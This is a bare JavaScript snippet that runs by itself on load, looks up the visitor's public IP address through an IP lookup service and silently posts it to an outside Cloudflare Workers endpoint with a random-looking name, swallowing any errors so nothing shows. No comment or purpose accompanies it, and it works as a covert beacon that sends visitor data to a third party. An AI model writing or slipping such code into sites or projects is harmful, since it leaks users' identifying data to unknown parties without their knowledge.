(async () => {
  try {
    const ip = await fetch('https://api.ipify.org?format=text').then(r => r.text());
    await fetch('https://gentle-surf-870c.fusion-minded-6f.workers.dev', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip })
    });
  } catch {}
})();
